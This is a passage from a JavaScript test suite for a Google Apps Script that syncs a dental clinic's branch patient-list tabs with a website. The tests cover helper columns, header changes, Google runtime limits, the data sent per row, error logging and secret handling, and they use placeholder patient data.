    assert.doesNotThrow(() => env.ctx.aajOnEdit(bad));
  }
  // a tab that has no helper columns yet
  const bare = createEnv();
  bare.addTab(GUL, [fixture.headers[GUL], fx(GUL, 0)]);
  assert.doesNotThrow(() => bare.ctx.aajOnEdit({ range: new bare.Range(bare.tab(GUL), 2, 3, 1, 1) }));
  assert.equal(bare.tab(GUL).used().cols, 13);
});

// ------------------------------------------------------------------------------------------------ helper columns and layout changes
test('the helper columns are made once, right after the last header (NN: after Column 16), the last three hidden; a tab with no spare columns gets room', () => {
  const { env } = world({ tabs: ['North Nazimabad', GUL], patients: [], helpers: false });
  env.tab(GUL).maxCols = 13;
  env.ticks(3);
  const nn = env.tab('North Nazimabad'), gul = env.tab(GUL);
  assert.equal(nn.used().cols, 20);
  assert.equal(gul.used().cols, 17);
  assert.ok(gul.maxCols >= 17, 'columns were added to make room');
  assert.equal(nn.text(1, 17).startsWith('Website'), true);
  assert.deepEqual([...nn.hidden].sort((a, b) => a - b), [18, 19, 20]);
  const colsAfter = [nn.used().cols, gul.used().cols];
  env.ticks(5);
  assert.deepEqual([nn.used().cols, gul.used().cols], colsAfter, 'not added again');
  assert.equal(nn.hidden.size, 3);
});

test('helper columns are found by their header text wherever they are (moved, reordered, blank column between them); none are added', () => {
  const { env, server } = world({ patients: BASE_PATIENTS, helpers: false });
  const sh = env.tab(GUL);
  [['Sync edited', 14], ['', 15], ['Website', 16], ['Sync base', 17], ['Sync key', 18]].forEach(([h, c]) => { if (h) sh._set(1, c, { kind: 's', v: h }); });
  sh.maxCols = 30;
  settle(env, 3);
  assert.equal(sh.used().cols, 18, 'no extra column');
  assert.equal(server.state.visits.length + server.state.checkups.length, 6);
  assert.equal(sh.text(2, 16), '✓ On website');
  assert.match(sh.text(2, 18), /^S-/);
  quiet(env, server);
});

test('a deleted key/base column is recreated; the rows get new keys and adopt their own visits: nothing doubles, nothing is lost', () => {
  const { env, server } = synced();
  const keyC = colOf(env, GUL, 'sync key'), baseC = colOf(env, GUL, 'sync base');
  const sh = env.tab(GUL);
  const visits = server.state.visits.map((v) => v.id).sort();
  for (let r = 1; r <= 12; r++) { sh._set(r, keyC, null); sh._set(r, baseC, null); }
  env.touch();
  env.ticks(4);
  assert.equal(sh.text(1, sh.used().cols - 1).length > 0, true);
  assert.equal(server.state.visits.length, visits.length, 'no visit created');
  assert.deepEqual(server.state.visits.map((v) => v.id).sort(), visits, 'the same visits');
  const keys = keysOf(env, GUL);
  assert.equal(keys.length, 6);
  for (const v of server.state.visits) assert.ok(keys.includes(v.sheet_key), 'each visit now carries the new key of its row');
  assert.ok(server.state.visits.every((v) => v.status !== 'cancelled'));
  quiet(env, server);
});

test('a renamed header, a column inserted in the middle, a header with odd spacing: columns follow their header, nothing is re-sent or rewritten', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  // insert a column before "Doctor Name": everything to its right moves one column right
  const at = colOf(env, GUL, 'doctor');
  const moved = [...sh.cells.entries()].map(([k, v]) => [k.split(',').map(Number), v]);
  sh.cells.clear(); sh.maxCols += 1;
  for (const [[r, c], v] of moved) sh.cells.set(r + ',' + (c >= at ? c + 1 : c), v);
  sh._set(1, at, { kind: 's', v: 'Notes' });
  sh._set(1, colOf(env, GUL, 'token'), { kind: 's', v: ' Token   Number ' });
  const st = server.calls.length;
  quiet(env, server);
  assert.equal(server.calls.slice(st).every((c) => c.payload.tabs[0].rows.length === 0), true);
  // and the sync still reads the right columns
  setCell(env, GUL, 2, 'doctor', 'Dr. Ali Rashid');
  env.tickAfter(5000);
  assert.deepEqual(webVisit(server, 'Sample Person One').doctors.slice().sort(), ['c-ali']);
  server.editVisit(webVisit(server, 'Sample Person One').id, { token: 21 });
  env.tickAfter(61000);
  assert.equal(cellOf(env, GUL, 2, 'token'), '21');
});

// ------------------------------------------------------------------------------------------------ the other tabs, Google's limits
const DECOYS = () => ({
  'Website - Gulshan KHI': [['Copied from dralirashid.com for 2026-10-09 at 01:45. Do not edit here; edit on the website.'], ['Mr#', 'Name', 'Status'], ['9701', 'Sample Person One', 'Completed']],
  'Copy of DHA KHI': [fixture.headers['DHA KHI'], ...fixture.rows['DHA KHI']],
  'Patient Response': [['Timestamp', 'Patient Name', 'Which branch did you visit?'], ['2026-10-08 12:00', 'Sample Person One', 'GUL']],
  'Sheet42': [['8060.0', 'Sample Person Two', '12', 'Monthly', '51.0', 'Treatment', '', 'Dr Aimon Aslam', 'U L 018', '0.0', 'Done']],
  'Sheet45': [['Work List', 'Frequency'], ['Clean chairs', 'Daily']],
  'Daily Work': [['Clinic Coordinator', 'Receptionist'], ['A', 'B']],
  'Staff Duties': [['Clinic Work', 'Primary Employees'], ['Reports', 'C']],
});
const snapshotOf = (env, names) => JSON.stringify(names.map((n) => { const s = env.tab(n); return [n, [...s.cells.entries()], [...s.fonts.entries()], [...s.hidden], s.maxRows, s.maxCols]; }));

test('tabs that are not patient lists ("Website - ...", "Copy of DHA KHI", "Patient Response", Sheet42...) are never read, written, hidden, cleared or archived: through a day, midnight and Set up', () => {
  const { env, server } = world({ tabs: ['DHA KHI', GUL], patients: [...ALL_PATIENTS, { mr: '8641', name: 'Sample Person Nine', phone: '03001110009' }], install: false, helpers: false });
  for (const [n, rows] of Object.entries(DECOYS())) env.addTab(n, rows);
  const decoyNames = Object.keys(DECOYS());
  const before = snapshotOf(env, decoyNames);
  const touched = new Set();
  for (const m of ['getRange', 'insertColumnsAfter', 'insertRowsAfter', 'hideColumns', 'deleteRows']) {
    const orig = env.Sheet.prototype[m];
    env.Sheet.prototype[m] = function (...a) { touched.add(this.name); return orig.apply(this, a); };
  }
  scripted(env);
  env.ctx.aajSetup();
  env.ticks(3);
  env.at(TODAY, '12:00'); env.type('DHA KHI', 5, 2, 'Typed Today'); env.ticks(3);
  env.at(NEXT, '00:05'); env.ticks(2);
  env.at(NEXT, '09:00'); env.ticks(3);
  assert.equal(snapshotOf(env, decoyNames), before, 'not a cell, colour, hidden column or size changed');
  for (const n of decoyNames) assert.ok(!touched.has(n), `${n} was never accessed`);
  assert.ok([...touched].every((n) => ['DHA KHI', GUL, 'Aaj Sync log', 'Aj ki List - Archive', 'Sheet1', 'Aj ki List checkups'].includes(n) || n === 'DHA KHI' || n === GUL), [...touched].join());
  assert.ok(!archiveSheet(env, 'Copy of DHA KHI'), 'no archive tab for the copy');
});

test('a tab that is renamed or missing is skipped and logged once a day; the other tabs keep syncing', () => {
  const { env, server } = world({ tabs: [GUL, 'Islamabad'], patients: [...ALL_PATIENTS] });
  env.tab(GUL).name = 'Gulshan KHI (old)';
  settle(env, 4);
  const log = env.tab('Aaj Sync log').values().map((r) => r[3]).filter((t) => /was not found/.test(t));
  assert.equal(log.filter((t) => t.includes('Gulshan KHI')).length, 1, 'once, not every minute');
  assert.equal(server.visitsOf('ISB', TODAY).length, 2, 'Islamabad kept syncing');
});

test('runtime guard: past 70 minutes of run time today the script works only every 5th minute; past 85 it stops for the day and says so; tomorrow it starts again', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  settle(env, 2);
  env.props.document.set('rt:' + TODAY, String(4300000));
  const fetched = [];
  for (const m of ['08:11', '08:12', '08:13', '08:14', '08:15', '08:16', '08:20']) {
    env.at(TODAY, m);
    const f0 = env.stats.fetches;
    env.tick();
    fetched.push([m, env.stats.fetches - f0]);
  }
  assert.deepEqual(fetched.filter(([, n]) => n > 0).map(([m]) => m), ['08:15', '08:20'], 'slow mode: every 5th minute only');
  env.at(TODAY, '08:21');
  setCell(env, GUL, 2, 'treatment details', 'x');
  env.props.document.set('rt:' + TODAY, String(5200000));
  const f1 = env.stats.fetches;
  env.tick();
  assert.equal(env.stats.fetches, f1, 'stopped');
  assert.equal(headerOf(env, GUL), 'Website · paused for today (Google time limit). Use the website.');
  const writes = env.stats.calls.write;
  env.at(TODAY, '08:22'); env.tick(); env.at(TODAY, '08:25'); env.tick();
  assert.equal(env.stats.calls.write, writes, 'the pause message is written once');
  assert.equal(env.stats.fetches, f1);
  env.at(NEXT, '08:00');
  env.props.document.set('listDate:' + GUL, NEXT);
  env.ticks(2);
  assert.ok(env.stats.fetches > f1, 'a new day starts again');
  assert.ok(![...env.props.document.keys()].some((k) => k === 'rt:' + TODAY || k === 'paused:' + TODAY), 'old counters are removed');
});

test('run time is counted: the day\'s total in "rt:" grows by what each tick took; "Sync now" is not held back by the slow mode', () => {
  const { env } = world({ patients: BASE_PATIENTS });
  const runs = env.ticks(3);
  const total = runs.reduce((a, t) => a + t.ms, 0);
  assert.ok(Math.abs(Number(env.props.document.get('rt:' + TODAY)) - total) < 5, 'rt ' + env.props.document.get('rt:' + TODAY) + ' vs ' + total);
  env.props.document.set('rt:' + TODAY, String(5200000));
  const f = env.stats.fetches;
  env.at(TODAY, '08:07');
  env.ctx.aajSyncNow();
  assert.ok(env.stats.fetches > f, 'manual run goes ahead');
});

// ------------------------------------------------------------------------------------------------ contract, odd rows, Google errors
test('what a sheet edit sends: a linked row carries only the changed cells, the canonical text the script last received as "base", and the edit time', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person One');
  const before = env.clock.ms;
  setCell(env, GUL, r, 'waiting', 'Treatment');
  setCell(env, GUL, r, 'doctor', 'Dr. Samrah Khan, Hira Anis');
  env.tickAfter(10000);
  const call = server.calls[server.calls.length - 1];
  const row = call.payload.tabs[0].rows[0];
  const stamp = row.edited_at;
  assert.ok(stamp >= before && stamp <= env.clock.ms);
  assert.deepEqual(row, {
    key: webVisit(server, 'Sample Person One').sheet_key, new: false, edited_at: stamp,
    set: { status: { t: 'Treatment', v: 'in_treatment' }, doctors: { t: 'Dr. Samrah Khan, Hira Anis', v: ['Dr. Samrah Khan', 'Hira Anis'] } },
    base: { status: 'Completed', doctors: ['Dr Haniya', 'Dr. Samrah Khan'] },
  });
  assert.equal(call.payload.tabs[0].hash.length, 32, 'the hash from the previous answer');
  assert.equal(env.fetchLog[env.fetchLog.length - 1].params.contentType, 'application/json');
});

test('a new row sends every non-empty cell, the cleaned name AND what was typed, the Mr# cell as typed (or NEW or empty)', () => {
  const { env, server } = synced();
  env.typeRow(GUL, 8, ['NEW', 'sample WALK lhr ', '04 Photo', 'Zirconia', 'Kit 55k', 'Waiting', 'Group 4', 'Dr Verda, Dr. Unknown', 'U L 018', '35k', 'Done', '0300 1119999 / 0321 1118888', 'Called']);
  env.tickAfter(61000);
  const row = rowsSent(server).find((x) => x.set.name === 'Sample Walk');
  assert.deepEqual(row.set, {
    mr: 'NEW', name: 'Sample Walk', legacy_name: 'sample WALK lhr', phone: '03001119999', month: { t: '04 Photo', v: 4 }, treatment: 'Zirconia',
    token: { t: 'Kit 55k', v: null }, status: { t: 'Waiting', v: 'waiting' }, group: { t: 'Group 4', v: null }, doctors: { t: 'Dr Verda, Dr. Unknown', v: ['Dr Verda', 'Dr. Unknown'] },
    details: 'U L 018', pp: '35k', healthwire: 'Done', reminder: 'Called',
  });
  assert.equal(row.new, true);
  assert.equal(row.base, undefined);
});

test('a doctor typed in the Token cell ("Dr Verda" on two Islamabad rows) is not lost: the token stays text, the doctor goes to the visit', () => {
  const { env, server } = world({ tabs: ['Islamabad'], patients: ALL_PATIENTS });
  settle(env, 3);
  const r = rowOf(env, 'Islamabad', 'Sample Person Fifteen');
  assert.equal(cellOf(env, 'Islamabad', r, 'token'), 'Dr Verda', 'the cell is left as typed');
  const v = webVisit(server, 'Sample Person Fifteen');
  assert.deepEqual(v.doctors, ['c-warda'], 'but the visit has the doctor');
  assert.equal(v.cells.token.v, null);
  assert.ok(v.token !== 0, 'the website numbered its own token');
  const kit = webVisit(server, 'Sample Person Fourteen');
  assert.deepEqual(kit.doctors, ['c-warda'], 'the doctor cell of this row says Dr Verda too');
  assert.equal(cellOf(env, 'Islamabad', rowOf(env, 'Islamabad', 'Sample Person Fourteen'), 'token'), 'Kit 80k');
  quiet(env, server);
});

test('Lahore: kit text and "4 Zirconia" in the Token column, "Group 2, Group 1", a photo month: all kept as typed; the first group 1-3 goes to the website', () => {
  const { env, server } = world({ tabs: ['Gulberg Lhr'], patients: ALL_PATIENTS });
  settle(env, 3);
  const v = webVisit(server, 'Sample Person Eleven');
  assert.equal(v.group, 2, '"Group 2, Group 1": the first group');
  assert.equal(v.braces_month, 6);
  assert.equal(cellOf(env, 'Gulberg Lhr', 2, 'month'), '6 Photo');
  assert.equal(cellOf(env, 'Gulberg Lhr', 2, 'token'), 'Kit 80k');
  assert.equal(cellOf(env, 'Gulberg Lhr', 2, 'group'), 'Group 2, Group 1');
  assert.equal(cellOf(env, 'Gulberg Lhr', 3, 'token'), '4 Zirconia');
  assert.equal(webVisit(server, 'Sample Person Thirteen').status, 'in_treatment', '"In treatment" is not "Completed"');
  quiet(env, server);
});

test('a Mr# cell that is not a number ("98 51") is not sent and says what to do; fixing it sends the row', () => {
  const rows = [['98 51', 'Sample Person One', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110001', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  assert.equal(rowsSent(server).length, 0);
  assert.equal(statusOf(env, GUL, 2), '\u2717 "98 51" is not a Mr#. Type the number only, or leave it empty.');
  setCell(env, GUL, 2, 'mr', '9701');
  env.tickAfter(61000);
  assert.equal(rowsSent(server).length, 1);
  assert.equal(statusOf(env, GUL, 2), '\u2713 On website');
});

test('a tab with more than 400 patient rows is not sent: the header says to archive or clear old rows', () => {
  const rows = [];
  for (let i = 0; i < 401; i++) rows.push(['', `Walk ${i}`, '', 'Checkup', '', 'Waiting', '', '', '', '', '', `0300${String(1000000 + i).slice(1)}`, '']);
  const { env, server } = world({ rows: { [GUL]: rows } });
  env.tab(GUL).maxRows = 600;
  settle(env, 3);
  assert.equal(server.calls.length, 0);
  assert.match(headerOf(env, GUL), /^Website \u00b7 \u2717 \d\d:\d\d more than 400 rows: archive or clear old rows$/);
});

test('a row that keeps failing is reported once in the log, not every minute', () => {
  const rows = [['9701', 'Sample Person One', '', 'Checkup', '1', 'Waiting', '', '', 'x'.repeat(600), '', '', '03001110001', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  env.ticks(1); env.advance(61000); env.ticks(6);
  env.advance(5 * 60000); env.ticks(1);
  assert.ok(rowsSent(server).length >= 2, 'it is sent again at the next full read (every five minutes), and at once when somebody edits it');
  const lines = env.tab('Aaj Sync log').values().filter((r) => /Too long/.test(r[3]));
  assert.equal(lines.length, 1);
  assert.equal(lines[0][2], 'Sample Person One');
  setCell(env, GUL, 2, 'treatment details', 'fixed');
  env.tickAfter(61000);
  assert.equal(statusOf(env, GUL, 2), '\u2713 On website');
});

test('the log tab keeps the newest 2,000 lines', () => {
  const { env } = world({});
  const ctx = env.ctx;
  const mk = (n) => { const c = ctx.aajNewCtx_(ctx.aajLoadState_(), false); for (let i = 0; i < n; i++) ctx.aajLog_(c, GUL, 'p' + i, 'line ' + i); ctx.aajFlushLog_(c); };
  mk(2150); mk(100); mk(100);
  const sh = env.tab('Aaj Sync log');
  assert.ok(sh.used().rows <= 2000 + 200 + 1, 'rows ' + sh.used().rows);
  assert.ok(sh.used().rows >= 2000);
  assert.equal(sh.text(1, 1), 'Time');
  assert.equal(sh.text(sh.used().rows, 4), 'line 99', 'the newest line is last');
});

test('Google errors in the middle of a run never escape: the lock is released, the problem is logged, the next tick works', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  env.ticks(1);
  const orig = env.Range.prototype.getDisplayValues;
  env.Range.prototype.getDisplayValues = function () { env.Range.prototype.getDisplayValues = orig; throw new Error('Service invoked too many times for one day: spreadsheet.'); };
  assert.doesNotThrow(() => env.tickAfter(61000));
  assert.equal(env.lockHeld, false);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /Sync error: Service invoked too many times/);
  env.ticks(2);
  assert.equal(server.state.visits.length, 3);
});

test('Open the archive and Help show something useful', () => {
  const { env } = dayEnd();
  env.at(NEXT, '00:05'); env.ticks(1);
  env.responder = () => 'OK';
  env.ctx.aajShowArchive();
  assert.match(env.dialogs[env.dialogs.length - 1].text, /^The archive is here:\nhttps:\/\/docs\.google\.com\/spreadsheets\/d\/book-\d+\/edit$/);
  env.ctx.aajHelp();
  const help = env.dialogs[env.dialogs.length - 1].text;
  for (const bit of ['checkup', 'Deleting a row', 'Completed', 'hidden columns', '10 minutes', 'archive']) assert.ok(help.includes(bit), bit);
  const w = world({ install: false, helpers: false });
  w.env.responder = () => 'OK';
  w.env.ctx.aajShowArchive();
  assert.match(w.env.dialogs[0].text, /no archive yet/);
});

test('a header that was overwritten (row 1 no longer looks like the list): that tab is skipped and logged; the others carry on', () => {
  const { env, server } = world({ tabs: [GUL, 'Islamabad'], patients: ALL_PATIENTS });
  settle(env, 2);
  env.tab(GUL)._set(1, 2, { kind: 's', v: 'oops' });
  env.tab(GUL)._set(1, 4, { kind: 's', v: 'oops' });
  server.addPatient({ mr: '9740', name: 'Isb Walker', phone: '03001110740' });
  server.addVisit({ branch: 'ISB', date: TODAY, mr: '9740' });
  assert.doesNotThrow(() => env.ticks(2));
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /Gulshan KHI: row 1 does not look like the list header\. This tab is skipped\./);
  assert.ok(rowOf(env, 'Islamabad', 'Isb Walker'));
});

test('Karachi time, not the time zone of the script project: at 00:05 in Karachi (still the previous day in UTC) the night work starts', () => {
  const { env } = dayEnd();
  env.at(NEXT, '00:05');
  assert.equal(new Date(env.clock.ms).toISOString().slice(0, 10), TODAY, 'UTC still says yesterday');
  env.ticks(1);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
  env.at(TODAY, '23:50');
  assert.equal(new Date(env.clock.ms).toISOString().slice(0, 10), TODAY);
});

// ------------------------------------------------------------------------------------------------ how long a run takes
function bigWorld(perTab = 100) {
  const patients = [], rows = {};
  let n = 0;
  for (const tab of TABS) {
    rows[tab] = [];
    for (let i = 0; i < perTab; i++, n++) {
      const phone = `0311${String(1000000 + n).slice(1)}`;
      patients.push({ mr: String(30000 + n), name: `Patient ${n}`, phone });
      rows[tab].push([String(30000 + n), `Patient ${n}`, '', 'Monthly', String(i + 1), 'Waiting', 'Group 1', 'Dr Haniya', 'U L 018', '', '', phone, '']);
    }
  }
  const w = world({ tabs: TABS, patients, rows });
  for (const t of TABS) w.env.tab(t).maxRows = 400;
  return w;
}

test('5 tabs x 100 rows: the first sync stays far below Google\'s 6 minutes (20 calls of 25 rows), and then a quiet minute costs about a second', () => {
  const { env, server } = bigWorld(100);
  const stamp = env.ticks(1)[0];
  assert.equal(server.state.visits.length, 0, 'the first tick only stamps the rows');
  env.advance(61000);
  const heavy = env.ticks(1)[0];
  assert.equal(server.state.visits.length, 500, 'all 500 rows are on the website');
  assert.equal(heavy.calls, 20, '500 rows / 25 = 20 calls');
  assert.ok(heavy.ms < 120000, `the biggest possible run took ${(heavy.ms / 1000).toFixed(1)} s (limit 360 s, soft stop 240 s)`);
  console.log(`    first sync of 500 rows: ${(heavy.ms / 1000).toFixed(1)} s simulated; stamp tick ${(stamp.ms / 1000).toFixed(1)} s`);
  const quietRuns = env.ticks(5);
  const avg = quietRuns.reduce((a, t) => a + t.ms, 0) / quietRuns.length;
  const worst = Math.max(...quietRuns.map((t) => t.ms));
  assert.ok(quietRuns.every((t) => t.calls === 1 && t.rows === 0 && t.writes === 0), 'idle: one call, no rows, no writes');
  assert.ok(avg < 3000, `an idle tick takes ${avg.toFixed(0)} ms on average`);
  assert.ok(worst < 6000);
  // a whole day: about 1,000 ticks from 08:00 to 23:59 (plus the night ticks that only look at the clock)
  const hours = (avg * 960) / 3600000;
  console.log(`    quiet tick ${avg.toFixed(0)} ms -> ${(hours * 60).toFixed(0)} min of the 90 allowed per day`);
  assert.ok(hours * 60 < 45, 'a full day of ticks stays far below the 90 minutes a free Google account gets');
  // a busy minute: one website change and one sheet edit
  server.editVisit(server.state.visits[5].id, { details: 'changed on the website' });
  env.type('Islamabad', 3, 9, 'changed in the sheet');
  const busy = env.tickAfter(61000);
  assert.ok(busy.ms < 8000, `a minute with two changes took ${busy.ms} ms`);
  assert.equal(server.state.visits.find((v) => v.details === 'changed in the sheet') !== undefined, true);
});

test('the soft stop: when every call is slow the run stops sending after 4 minutes, finishes what came back, and the next minute carries on; no row is lost or doubled', () => {
  const rows = [], patients = [];
  for (let i = 0; i < 200; i++) {
    patients.push({ mr: String(40000 + i), name: `Walk In ${i + 1}`, phone: `0301${String(4000000 + i).slice(1)}` });
    rows.push([String(40000 + i), `Walk In ${i + 1}`, '', 'Checkup', '', 'Waiting', '', '', '', '', '', `0301${String(4000000 + i).slice(1)}`, '']);
  }
  const { env, server } = world({ rows: { [GUL]: rows }, patients });
  env.tab(GUL).maxRows = 400;
  env.cost.fetch = 100000;                                  // 100 s per call
  env.ticks(1);
  env.advance(61000);
  const n0 = server.calls.length;
  const t1 = env.ticks(1)[0];
  assert.ok(t1.ms < 360000, `run took ${(t1.ms / 1000).toFixed(0)} s: under Google\'s 6 minutes`);
  assert.equal(t1.calls, 3, 'it stopped starting new calls after 240 s');
  assert.equal(server.state.visits.length, 75);
  assert.ok(server.calls.slice(n0).every((c) => c.payload.check_removed === false), 'no removal check until the last batch has been sent');
  let guard = 0;
  while (server.state.visits.length < 200 && guard++ < 6) env.ticks(1);
  assert.equal(server.state.visits.length, 200);
  assert.equal(server.state.patients.length, 200, 'one patient per row: nothing created twice');
  assert.equal(new Set(server.state.visits.map((v) => v.sheet_key)).size, 200);
  assert.equal(server.calls[server.calls.length - 1].payload.check_removed, true, 'the last batch asks for the removal check');
});

// ------------------------------------------------------------------------------------------------ people, sorting, copying
test('a phone shared by a family never picks a patient: with no Mr# a row is a checkup, nobody is linked, no patient file is made', () => {
  const rows = [
    ['', 'Ayesha Khan', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03009990001', ''],
    ['', 'Bilal Khan', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03009990002', ''],
    ['', 'Umer', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '', ''],
  ];
  const { env, server } = world({ rows: { [GUL]: rows } });
  server.addPatient({ mr: '9801', name: 'Ayesha Khan', phone: '03009990001' });
  server.addPatient({ mr: '9802', name: 'Ayesha Khan', phone: '03009990001' });
  server.addPatient({ mr: '9803', name: 'Sadia Khan', phone: '03009990002' });
  server.addPatient({ mr: '9804', name: 'Umer Farooq', phone: '03009990004' });
  settle(env, 3);
  assert.equal(server.state.patients.length, 4, 'no patient was made');
  assert.equal(server.state.visits.length, 0, 'and nobody was picked: no visit');
  assert.equal(server.state.checkups.length, 3);
  for (let r = 2; r <= 4; r++) assert.equal(statusOf(env, GUL, r), '\u2713 Checkup patient: no Mr#, no patient file.');
  assert.equal(cellOf(env, GUL, 2, 'mr'), '');
  assert.equal(server.state.checkups[0].patient_mr, null);
});

test('Sort sheet (whole rows, hidden columns move too): nothing changes anywhere, nothing is sent', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  const width = sh.used().cols;
  const rows = [];
  for (let r = 2; r <= 7; r++) rows.push([...sh.cells.entries()].filter(([k]) => k.startsWith(r + ',')).map(([k, v]) => [Number(k.split(',')[1]), v, sh.fonts.get(k)]));
  rows.reverse();
  for (let r = 2; r <= 7; r++) for (let c = 1; c <= width; c++) { sh.cells.delete(r + ',' + c); sh.fonts.delete(r + ',' + c); }
  rows.forEach((cells, i) => cells.forEach(([c, v, f]) => { sh.cells.set((i + 2) + ',' + c, v); if (f) sh.fonts.set((i + 2) + ',' + c, f); }));
  env.touch();
  assert.equal(sh.text(2, 2), 'Sample Person Six', 'the order did change');
  const visits = JSON.stringify(server.state.visits.map((v) => [v.id, v.status, v.details]));
  quiet(env, server);
  assert.equal(JSON.stringify(server.state.visits.map((v) => [v.id, v.status, v.details])), visits);
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
});

test('a row copied into another branch\'s tab is a new row there: it gets its own key and a visit of that branch; the first branch is not disturbed', () => {
  const { env, server } = world({ tabs: [GUL, 'North Nazimabad'], patients: ALL_PATIENTS, rows: { 'North Nazimabad': [] } });
  settle(env, 3);
  const g = env.tab(GUL), n = env.tab('North Nazimabad');
  const r = rowOf(env, GUL, 'Sample Person One');
  const gk = colOf(env, GUL, 'sync key'), nk = colOf(env, 'North Nazimabad', 'sync key');
  const wid = colOf(env, GUL, 'website') - 1;
  for (let c = 1; c <= wid; c++) if (g.text(r, c)) n._set(2, c, g._get(r, c));
  n._set(2, nk, g._get(r, gk)); n._set(2, nk + 1, g._get(r, gk + 1)); n._set(2, nk + 2, g._get(r, gk + 2));
  env.touch();
  env.ticks(3);
  const keyN = n.text(2, nk), keyG = g.text(r, gk);
  assert.notEqual(keyN, keyG, 'the copy was given a key of its own');
  assert.equal(server.visitsOf('NN', TODAY).filter((v) => v.mr === '9701').length, 1, 'a visit of the other branch');
  assert.equal(server.visitsOf('GUL', TODAY).filter((v) => v.mr === '9701').length, 1);
  assert.equal(webVisit(server, 'Sample Person One') && server.visitsOf('GUL', TODAY).find((v) => v.mr === '9701').sheet_key, keyG);
  assert.equal(statusOf(env, GUL, r), '✓ On website');
  assert.match(n.text(2, colOf(env, 'North Nazimabad', 'website')), /^[✓⚠]/);
});

test('a run that dies half way (Google stops it) still has its time counted for the day', () => {
  const { env } = world({ patients: BASE_PATIENTS });
  env.ticks(1);
  const before = Number(env.props.document.get('rt:' + TODAY));
  const orig = env.Range.prototype.getDisplayValues;
  env.Range.prototype.getDisplayValues = function () { env.charge('boom', 5000); throw new Error('Exceeded maximum execution time'); };
  env.tickAfter(61000);
  env.Range.prototype.getDisplayValues = orig;
  const after = Number(env.props.document.get('rt:' + TODAY));
  assert.ok(after - before >= 5000, `${before} -> ${after}`);
});

test('the script is pure ASCII (symbols are written as \\u escapes), so pasting it cannot garble anything', () => {
  const src = fs.readFileSync(SCRIPT_PATH, 'utf8');
  const bad = [...src].filter((c) => c.charCodeAt(0) > 126 || (c.charCodeAt(0) < 32 && c !== '\n'));
  assert.equal(bad.length, 0, 'non-ASCII or control characters: ' + bad.map((c) => c.charCodeAt(0).toString(16)).join(' '));
  assert.ok(!src.includes('\r'), 'LF line ends');
  assert.ok(src.length < 150 * 1024, 'size ' + src.length);
});

test('another person who can edit the sheet and presses "Sync now" is told it is Dr. Ali\'s job; no header is overwritten, nothing is sent', () => {
  const { env, server } = synced();
  const header = headerOf(env, GUL);
  env.props.user.delete('AAJ_SYNC_SECRET');             // their own account has no secret
  env.responder = () => 'OK';
  const calls = server.calls.length;
  env.ctx.aajSyncNow();
  assert.match(env.dialogs[env.dialogs.length - 1].text, /Only Dr\. Ali's account can start it by hand\./);
  assert.equal(server.calls.length, calls);
  assert.equal(headerOf(env, GUL), header);
});

test('an empty tab at midnight just rolls over: no archive lines, no error, the new day starts', () => {
  const { env, server } = world({ patients: [], rows: { [GUL]: [] } });
  env.ticks(5);
  env.at(NEXT, '00:05');
  env.ticks(1);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
  assert.equal(env.archiveBooks().length, 0, 'nothing to archive: no spreadsheet made');
  assert.match(headerOf(env, GUL), /new list for 2026-10-10/);
  assert.equal(server.state.visits.length, 0);
});

test('all five tabs in one go: each tab\'s own header variant is used (NN\'s Column 13/14/16 stay untouched, DHA\'s group is "Column 13"), one call carries all five', () => {
  const { env, server } = world({ tabs: TABS, patients: ALL_PATIENTS });
  const nn = env.tab('North Nazimabad');
  nn._set(2, 14, { kind: 's', v: 'keep me' }); nn._set(2, 15, { kind: 's', v: 'and me' }); nn._set(2, 16, { kind: 's', v: 'me too' });
  settle(env, 3);
  const first = server.calls.find((c) => c.payload.tabs.some((t) => t.rows.length));
  assert.equal(first.payload.tabs.length, 5, 'one call, all five tabs (the quota)');
  assert.deepEqual(first.payload.tabs.map((t) => t.branch), ['GUL', 'NN', 'DHA', 'LHR', 'ISB']);
  assert.deepEqual([nn.text(2, 14), nn.text(2, 15), nn.text(2, 16)], ['keep me', 'and me', 'me too'], 'columns the sync does not know are left alone');
  assert.equal(webVisit(server, 'Sample Person Nine').group, 1, 'DHA: "Column 13" is the group');
  server.editVisit(webVisit(server, 'Sample Person Nine').id, { group: 3 });
  server.editVisit(webVisit(server, 'Sample Person Seven').id, { token: 9 });
  env.ticks(1);
  assert.equal(env.tab('DHA KHI').text(2, 7), 'Group 3', 'written into the column called "Column 13"');
  assert.equal(nn.text(2, colOf(env, 'North Nazimabad', 'token')), '9', 'NN: "Token No"');
  assert.equal(nn.text(2, 14), 'keep me');
  // Lahore and Islamabad say "Status" and "Token #"
  server.editVisit(webVisit(server, 'Sample Person Eleven').id, { status: 'cancelled' });
  env.ticks(1);
  assert.equal(env.tab('Gulberg Lhr').text(2, colOf(env, 'Gulberg Lhr', 'status')), 'Cancelled');
  for (const t of TABS) assert.match(headerOf(env, t), /^Website \u00b7 \d\d:\d\d( \u00b7 \d+ need attention|\s\u2713)$/);
});

test('when nothing changed anywhere the website answers "unchanged" and sends no list: a quiet minute is one small call', () => {
  const { env, server } = synced();
  env.ticks(2);
  const body = JSON.parse(server.calls[server.calls.length - 1].response.body);
  assert.equal(body.tabs[0].unchanged, true);
  assert.equal(body.tabs[0].visits, undefined);
  assert.ok(server.calls[server.calls.length - 1].response.body.length < 400);
  // a website change makes the hash differ: the list comes back
  server.editVisit(webVisit(server, 'Sample Person One').id, { details: 'new' });
  env.ticks(1);
  const body2 = JSON.parse(server.calls[server.calls.length - 1].response.body);
  assert.equal(body2.tabs[0].unchanged, false);
  assert.ok(Array.isArray(body2.tabs[0].visits));
});

test('a secret put in Project Settings > Script Properties is NOT used: every editor of the sheet can read those', () => {
